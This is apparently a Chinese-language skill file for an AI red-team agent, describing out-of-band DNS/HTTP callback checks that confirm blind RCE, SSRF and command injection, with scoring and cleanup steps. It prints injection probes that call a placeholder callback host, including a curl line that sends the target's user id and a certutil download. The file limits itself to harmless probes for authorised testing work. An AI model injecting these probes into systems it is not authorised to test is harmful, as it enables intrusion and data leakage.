---
name: oob-verify
description: 【验证】OOB 带外验证：用 DNS/HTTP 回调确认盲 RCE、SSRF、反序列化与命令执行，避免“以为打通了”
whenToUse: 盲打 RCE/SSRF/反序列化/模板注入，HTTP 响应看不到结果；或需要证明命令真的在目标上执行时
role: vuln-scan
category: 验证
tags: [oob, dns, rce, ssrf]
enabled: true
---

# OOB 带外验证

> 只执行**无害探针**：`nslookup <token>`、`curl http://<token>`、`ping -c 1 <token>`。不要用 OOB 通道执行破坏性命令；确认后再用 `id`/`whoami`/唯一 token 做最小验证。

## 前置

- 一个公网可达的回调端：`interactsh-client`，或自建 VPS 的 DNS/HTTP 服务；
- 能注入命令/URL 的入口；
- 记录 token 与时间窗口，避免把其它噪声误判成命中。

## 流程

1. **创建 token**：`interactsh-client -v` 拿到域名/URL；或 VPS 上起一个只记录请求的 HTTP 服务；
2. **注入无害探针**：
   ```text
   nslookup <token>.oob.example
   curl -s http://<token>.oob.example/$(id -u)
   ping -c 1 <token>.oob.example
   ```
   Windows 用 `nslookup` / `certutil -urlcache -f http://...`；按目标平台选；
3. **轮询回调**：确认来源 IP、时间、路径/子域；如果只有 DNS，记录解析时间；
4. **最小命令验证**：确认回调后，再用 `id`/`whoami`/`hostname` 或唯一字符串确认执行上下文；
5. **落库**：`redteam_vuln_add`（status=confirmed，`request`/`response` 或 payload/回显）+ `score_hit` 的 `command`/`result`；OOB 记录作为 `evidence_ref`。

## 判定

- 只有 DNS 命中：证明能出网/解析，不等于命令执行；需要应用层证据；
- HTTP 命中且带命令输出：可确认 RCE/命令注入；
- 同 token 多来源：区分目标、代理、CDN、扫描器噪声；
- 无回调不等于没有漏洞：可能出网被禁、DNS 被拦、payload 不适用；换协议/端口再试，仍无则如实标“未确认”。

## 记分

- 盲 RCE/命令执行 → `server-host`（普通/管理员档）；
- SSRF 打内网/云 metadata → 按实际成果记 `cloud-platform`/`internal`/`boundary-*`；
- 只证明 SSRF 出网、没有读到内网数据：记漏洞，不硬记高分；
- 边界突破要按四问提供入口/落点/隔离/实际访问证据。

## OPSEC

- OOB 域名不要用目标单位关键词；token 随机；
- 回调服务只记录必要元数据，不收集无关数据；
- 不通过 OOB 执行下载/落地/持久化，除非任务明确要求；
- 结束后关闭监听、清理 token/日志（自己的），登记 `redteam_cleanup`。

## 交接

回报：入口、payload、回调时间/来源、是否确认执行、能拿到什么权限；`needs` 写清缺的回调基础设施。
